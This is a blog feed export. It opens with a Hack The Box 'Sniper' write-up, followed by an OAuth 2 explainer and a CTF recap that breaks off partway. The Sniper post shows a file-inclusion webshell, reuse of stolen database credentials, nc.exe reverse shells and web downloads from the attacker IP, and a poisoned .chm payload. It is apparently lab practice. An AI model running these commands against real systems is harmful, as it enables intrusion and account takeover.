&lt;p&gt;sniper.htb&lt;/p&gt;

&lt;p&gt;After I noticed port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; was opened I visited that site and got this as output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/sniper_htb.jpg&quot; alt=&quot;sniperhtb&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From above, it was a good delivery website. So I checked everypart of the website and found this directory as interesting &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sniper.htb/blog/index.php&lt;/code&gt; . Here I found language where I was able to change the language &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sniper.htb/blog/?lang=blog-en.php&lt;/code&gt; . This happens due to the RFI (Remote File Inclusion) vulnerability in the webservices.&lt;/p&gt;

&lt;h3 id=&quot;webshell&quot;&gt;Webshell&lt;/h3&gt;
&lt;p&gt;Since &lt;code class=&quot;highlighter-rouge&quot;&gt;Sniper&lt;/code&gt; had &lt;code class=&quot;highlighter-rouge&quot;&gt;SMB(Server Mail Box)&lt;/code&gt; service. So I combined with RFI to get a webshell. For that you can follow this link &lt;a href=&quot;http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/sniper_webshell.png&quot; alt=&quot;webshell.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Above you can see the webshell. So, now I used nc to get the actually shell. For that I had to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; to the webshell. 
If you don’t have then you can download from &lt;a href=&quot;https://github.com/gr4n173/tools.git&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now before uploading that I made a dir named &lt;code class=&quot;highlighter-rouge&quot;&gt;gr4n173&lt;/code&gt;&lt;br /&gt;
you can see the pic below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/nc_uploaded.png&quot; alt=&quot;nc_shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;then uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; tool to that directory as:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/upload_nc.png&quot; alt=&quot;uploadnc&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;unprivileged-shell&quot;&gt;Unprivileged shell&lt;/h3&gt;

&lt;p&gt;Now I setup a listener on and used the command of &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; as:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/reverse_shell.png&quot; alt=&quot;reverse&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;listener&quot;&gt;Listener:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 50602
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\gr4n173&amp;gt;whoami
whoami
nt authority\iusr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here I was unable to run any commands, so I switched to powershell as:&lt;/p&gt;

&lt;h4 id=&quot;power-shell&quot;&gt;Power shell&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\gr4n173&amp;gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\gr4n173&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I found the &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris&lt;/code&gt; user. Since I m unprivelege user so no any permission was granted.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users&amp;gt; ls
ls
    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         4/9/2019   6:47 AM                Administrator                                                         
d-----        4/11/2019   7:04 AM                Chris                                                                 
d-r---         4/9/2019   6:47 AM                Public                                                                
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now I had to change the user from unprivileged to privileged for that I searched everypart of the dir and found the creds of user &lt;code class=&quot;highlighter-rouge&quot;&gt;chris&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris:36mEAhz/B8xQ~2VM&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\inetpub\wwwroot\user&amp;gt; more db.php
more db.php
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Enter your Host, username, password, database below.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// I left password empty because i do not set password on localhost.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$con&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dbuser&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;36mEAhz/B8xQ~2VM&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sniper&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Check connection&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mysqli_connect_errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Failed to connect to MySQL: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_connect_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;By combining creds and &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; I got the user shell. Before that I created the folder &lt;code class=&quot;highlighter-rouge&quot;&gt;files&lt;/code&gt; and downloaded the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; tool inside. Since it’s 2020 as python2 died so I used python3 server as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\gr4n173&amp;gt; cd files
cd files
PS C:\gr4n173\files&amp;gt; Invoke-Webrequest -Uri http://10.10.14.11:8000/nc.exe -OutFile nc.exe
Invoke-Webrequest -Uri http://10.10.14.11:8000/nc.exe -OutFile nc.exe
PS C:\gr4n173\files&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~var/www/html/pub$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.151 - - [28/Mar/2020 20:38:14] &quot;GET /nc.exe HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally downloaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt;. Now I used &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; to know the if I can run the command as&lt;/p&gt;

&lt;h3 id=&quot;privilege-user&quot;&gt;Privilege User&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\gr4n173\files&amp;gt; $pass =cOnvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$pass =cOnvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
PS C:\gr4n173\files&amp;gt; $cred = New-Object System.Management.Automation.PSCredential(&quot;.\chris&quot;,$pass)
$cred = New-Object System.Management.Automation.PSCredential(&quot;.\chris&quot;,$pass)
PS C:\gr4n173\files&amp;gt; Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred 
Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred 
sniper\chris
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In above command, at first I defined a variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$pass&lt;/code&gt; which store the password and another variable &lt;code class=&quot;highlighter-rouge&quot;&gt;cred&lt;/code&gt; for passing the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pass&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt; and last one gaves the output of command &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt;. Hence I can run the &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt; .&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h2&gt;

&lt;p&gt;So I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc reverse shell&lt;/code&gt; as with a listener on.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\gr4n173\files&amp;gt; Invoke-Command -Computer Sniper -ScriptBlock { C:\gr4n173\files\nc.exe 10.10.14.11 4445 -e powershell } -Credential $cred 
Invoke-Command -Computer Sniper -ScriptBlock { C:\gr4n173\files\nc.exe 10.10.14.11 4445 -e powershell } -Credential $cred 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;listener-1&quot;&gt;Listener:&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 50671
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
 
PS C:\Users\Chris\Documents&amp;gt; hostname
hostname
Sniper
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This way I got the user.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users\Chris\Desktop&amp;gt; ls
ls
    Directory: C:\Users\Chris\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/11/2019   8:15 AM             32 user.txt                                                              


PS C:\Users\Chris\Desktop&amp;gt; more user.txt
more user.txt
21f4d******************
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;user-to-root&quot;&gt;User to Root&lt;/h2&gt;

&lt;p&gt;For root I searched every part of the user shell and uncomplete &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file was found inside Chris’s Downloads directory:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users\Chris\Downloads&amp;gt; ls
ls
    Directory: C:\Users\Chris\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/11/2019   8:36 AM          10462 instructions.chm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;poisoning-chm&quot;&gt;Poisoning .chm&lt;/h3&gt;

&lt;p&gt;In order to poison, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;Out-CHM.ps1&lt;/code&gt; while  from &lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;Nishang&lt;/a&gt; which is quite Interesting git repo especially related to window.&lt;/p&gt;

&lt;p&gt;I used nishand tool and opened it in powershell.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS: &amp;gt; Import-Module .\Out-CHM.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now I used the powershell to bypasss the Antivirus security.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS: &amp;gt; powershell.exe -ExecutionPolicy Bypass
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I download the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc64.exe&lt;/code&gt; to the Chris’s Documents folder as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS: &amp;gt; Out-CHM -Payload &quot;cd C:\Users\Chris\Documents;./nc64.exe
10.10.14.11 8888 -e powershell&quot; -HHCPath &quot;C:\Program Files (x86)\HTML
Help Workshop&quot; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here, I defined the dir of &lt;code class=&quot;highlighter-rouge&quot;&gt;nc64.exe&lt;/code&gt; and used &lt;a href=&quot;https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7&quot;&gt;this&lt;/a&gt; to exploit. File name &lt;code class=&quot;highlighter-rouge&quot;&gt;doc.chm&lt;/code&gt; was created and you can get here &lt;a href=&quot;/public/files/doc.chm&quot;&gt;file&lt;/a&gt;. This way I created the poison of &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Now I downloaded the created file to user shell &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris&lt;/code&gt; with a listener on along with the &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 server&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/pub&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users\Chris\Documents&amp;gt; Invoke-Webrequest -Uri http://10.10.14.11:8000/doc.chm -OutFile doc.chm                                                                   
Invoke-Webrequest -Uri http://10.10.14.11:8000/doc.chm -OutFile doc.chm  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-shell&quot;&gt;Root Shell&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$nc -lvnp 8888                              
listening on [any] 8888 ...  
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 53447                 
Microsoft Windows [Version 10.0.17763.678]                                   
C:\Windows\system32&amp;gt;whoami                                                   
sniper\administrator                                                         
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This way I can read the &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
PS C:\Users\Administrator\Desktop&amp;gt; more root.txt     
5624caf********************     
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This way I got the root of Sniper box and learned alot from this box. So I would like to thank creators of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;MinatoTW &amp;amp; felamos&lt;/code&gt; for such an awesome box. Especially poisoning &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; was awesome.&lt;/p&gt;

&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;/p&gt;

&lt;p&gt;Feedback are really appreciated !!&lt;/p&gt;

&lt;p&gt;Tweet about this writeup if you like.&lt;/p&gt;

&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="windows" /><category term="SMB" /><category term=".chm" /><category term="Powershell" /><category term="nc.exe" /><category term="webshell" /><category term="Invoke" /><category term="nishang" /><category term="htb" /><summary type="html">HTB:Sniper</summary></entry><entry><title type="html">OAuth 2</title><link href="http://localhost:4000/2020/03/22/oauth-2.html" rel="alternate" type="text/html" title="OAuth 2" /><published>2020-03-22T00:00:00+05:45</published><updated>2020-03-22T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/22/oauth-2</id><content type="html" xml:base="http://localhost:4000/2020/03/22/oauth-2.html">&lt;hr /&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;OAuth 2 is an authorization framework that enables applications to obtain limited access to user accounts on HTTP Service like Google, Facebook, GitHub etc. In other sense, it is a protocol that allow a user to grant the access to their resources on one site, to another site without having to expose their credentials.&lt;/p&gt;

&lt;p&gt;Let’s dive deep into OAuth 2 with the actual work flow involved in it. Basically there are four roles involved in it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;OAuth 2 Roles:-&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Resource Owner&lt;/li&gt;
  &lt;li&gt;Client&lt;/li&gt;
  &lt;li&gt;Resource Server&lt;/li&gt;
  &lt;li&gt;Authorization Server&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Resource Owner: User&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;An entity capable of granting the access to the protected resources. It is actually a &lt;em&gt;user&lt;/em&gt; who authorize the access to their &lt;em&gt;application&lt;/em&gt;. Typically this is an end-user.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Client: Application&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;An client is the &lt;em&gt;application&lt;/em&gt; which wants to access the user’s account. To access the protected account it must be authorized by user and authorization must be valid with the Authorization server i.e API .&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource/Authorization Server: API&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Resource Server is hosting the protected resources of certain user where as Authorization Server verify the identity of &lt;em&gt;user&lt;/em&gt; and providing the access_token to the &lt;em&gt;application&lt;/em&gt; for authorization.&lt;/p&gt;

&lt;h3 id=&quot;workflow-of-oauth-2&quot;&gt;Workflow of OAuth 2&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; +--------+                               +---------------+
 |        |--(1)- Authorization Request -&amp;gt;|   Resource    |
 |        |                               |     Owner     |
 |        |&amp;lt;-(2)-- Authorization Grant ---|               |
 |        |                               +---------------+
 |        |
 |        |                               +---------------+
 |        |--(3)-- Authorization Grant --&amp;gt;| Authorization |
 | Client |                               |     Server    |
 |        |&amp;lt;-(4)----- Access Token -------|               |
 |        |                               +---------------+
 |        |
 |        |                               +---------------+
 |        |--(5)----- Access Token ------&amp;gt;|    Resource   |
 |        |                               |     Server    |
 |        |&amp;lt;-(6)--- Protected Resource ---|               |
 +--------+                               +---------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take an example to explain the real work flow involved in OAuth 2.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Authorization Request&lt;br /&gt;
I have taken a new user ‘test’ and request the resource owner &lt;strong&gt;qtc&lt;/strong&gt; user.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Authorization Grant&lt;br /&gt;
By exploiting the contact form user &lt;em&gt;test&lt;/em&gt; will grant authorization by user &lt;em&gt;qtc&lt;/em&gt; using the &lt;strong&gt;code&lt;/strong&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Authorization Grant&lt;br /&gt;
Now I am into user &lt;strong&gt;qtc&lt;/strong&gt; and requesting access-token presenting an authorization grant to the authorization server.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Access Token&lt;br /&gt;
Authorization server authenticates the client(&lt;strong&gt;application&lt;/strong&gt;) that I have used and validates the authorization grant, and if valid , issues an access token that to user which will be invalid after 600 sec.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Access Token&lt;br /&gt;
Now client (&lt;strong&gt;application&lt;/strong&gt;) request the protected resources using above &lt;em&gt;access_token&lt;/em&gt; and will be authenticated by server.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Protected Resources  &lt;br /&gt;
After verifying the &lt;strong&gt;access_token&lt;/strong&gt; and &lt;strong&gt;sessionid&lt;/strong&gt; of that user Resource server will provide the protected resources.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Firstly, let’s talk about the basic topic involved in OAuth 2.&lt;/p&gt;

&lt;h4 id=&quot;authorization-grant&quot;&gt;Authorization Grant&lt;/h4&gt;
&lt;p&gt;Authorization grant is a credentials representing the resource owner’s authorization used by the client to obtain an access token. There are four types of grant:- implicit, authorization code, resource owner password credentials and client credentials.&lt;/p&gt;

&lt;h4 id=&quot;authorization-code&quot;&gt;Authorization Code&lt;/h4&gt;
&lt;p&gt;The authorization code is obtained by using an authorization server as an intermediary between the client and resource owner.  Instead of requesting authorization directly from the resource owner, the client directs the resource owner to an authorization server which in turn directs the resource owner back to the client with the authorization code.&lt;/p&gt;

&lt;h4 id=&quot;client-credentials&quot;&gt;Client Credentials&lt;/h4&gt;
&lt;p&gt;Client credentials can be used as authorization grant  when authorization scope is limited to the protected resources under the control of the client. It is used as authorization grant typically when the client is acting on its own behalf(the client is the resource owner) or requesting to access the protected resources.&lt;/p&gt;

&lt;h4 id=&quot;access-token&quot;&gt;Access token&lt;/h4&gt;
&lt;p&gt;Access token are the credentials with the combination of strings used to access protected resources.&lt;/p&gt;

&lt;h4 id=&quot;client-registration&quot;&gt;Client Registration&lt;/h4&gt;
&lt;p&gt;Before initiating the protocol, the client registers with the authorization server. The means through which the client registers with the authorization server are beyond the scope of this specification but typically involve end-user interaction with an HTML registration form. When supported by the authorization server, registration can rely on other means for establishing trust and obtaining the required client properties (e.g., redirection URI, client type).&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Client Type&lt;br /&gt;
Basically there are two client type based on their ability to authenticate securely with authorization with authorization server.
    &lt;ul&gt;
      &lt;li&gt;Confidential Type
   	- Here application is capable of maintaining the confidentiality of their credentials or capable of secure client authentication using other means.&lt;/li&gt;
      &lt;li&gt;Public Type
        &lt;ul&gt;
          &lt;li&gt;Here application is incapable of maintaining the confidentiality of their credentials or incapable of secure client authentication using any other means.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Redirection URI &lt;br /&gt;
It redirects the user-agent of service after an authorization code is granted. For e.g I used my local server to see the response from the request I send in a certain field like contact form(vulnerable field) and finally got the &lt;strong&gt;sessionid&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Below you can see the real work flow involve in Oauth2 and it’s really Oouch…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/oauth2.jpg&quot; alt=&quot;work_flow&quot; /&gt;&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="oauth2" /><category term="server" /><summary type="html"></summary></entry><entry><title type="html">CTF: Nephack 3.0</title><link href="http://localhost:4000/2020/03/07/ctf-nephack3.html" rel="alternate" type="text/html" title="CTF: Nephack 3.0" /><published>2020-03-07T00:00:00+05:45</published><updated>2020-03-07T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/07/ctf-nephack3</id><content type="html" xml:base="http://localhost:4000/2020/03/07/ctf-nephack3.html">&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;Actually NepHack is one of the Biggest Hacking Competition of Nepal after &lt;a href=&quot;https://threatcon.io/&quot;&gt;threatcon&lt;/a&gt; which is especially CTF (Jeopardy type) competition which is held annually every year in K.U.( Kathmandu University), Dhulikhel, Nepal. But unfortunately this year due to some internal problem of K.U NepHack 3.0 was held in premises of &lt;a href=&quot;https://cynicaltechnology.com/&quot;&gt;Cynical Technology&lt;/a&gt; .&lt;/p&gt;

&lt;p&gt;Event happened at Jan 25–26,2020 but unfortunately I wasn’t able to attend due to my work . Luckily they decided to went live for 48 hours to play online(nephack.io)after 2 days of the event and I would like to thank Cynical Technology for it.&lt;/p&gt;

&lt;p&gt;During that live session, I was able to secure first position but at last hour i.e. 10:00 pm I was downgraded to 2nd position by team caphilates but the score was equal. I would like to Congratulate team caphilates for winning the NepHack 3.0 online.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/score_board.png&quot; alt=&quot;Score_board&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here I would like to especially focus on the Pwnable challenges and talking about my background,I am active at Hack The Box( HTB) since 6 months. You can see my profile here &lt;a href=&quot;https://www.hackthebox.eu/profile/60443&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;pwnable-challenges&quot;&gt;PWNABLE-»CHALLENGES&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/challenges_pwn.png&quot; alt=&quot;challenge&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I was able to solve two challenges only: Shadow and Duffer. Among them I liked Duffer box because it was related to Buffer-overflow.&lt;/p&gt;

&lt;p&gt;It was the time when our team decided to organize CTF outside the Valley. We created many challenges for CTF and event was successfully conducted you can see details here &lt;a href=&quot;https://www.facebook.com/events/424450345158496/?active_tab=discussion&quot;&gt;VECTORCTF(CoTS)&lt;/a&gt;. Among them I had created one of the challenges related to bof and luckily same challenge was in NepHack 3.0 which was of 496 points named Duffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/duffer.png&quot; alt=&quot;duffer&quot; /&gt;&lt;/p&gt;

&lt;p&gt;They have given ssh.log file on&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$cat ssh.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh.log&lt;/code&gt;. part file there I can see the ssh login attempt log file by different user . I got the credentials from one of the members &lt;em&gt;maskop9&lt;/em&gt; from winning team(me0w) during live event . Credential is hacker/cynical1 with local IP &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.10.189&lt;/code&gt;. Since IP given was local IP, I wasn’t able to ssh into that user so I had to figure out other ways and I noticed I had a shell from shadow challenge which was of &lt;code class=&quot;highlighter-rouge&quot;&gt;phindrella&lt;/code&gt; user and I am going to publish next Writeup where I will explain how I got &lt;code class=&quot;highlighter-rouge&quot;&gt;phindrella&lt;/code&gt; user and it’s shell.&lt;/p&gt;

&lt;p&gt;Then, I tried with that credentials as&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/shell.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;

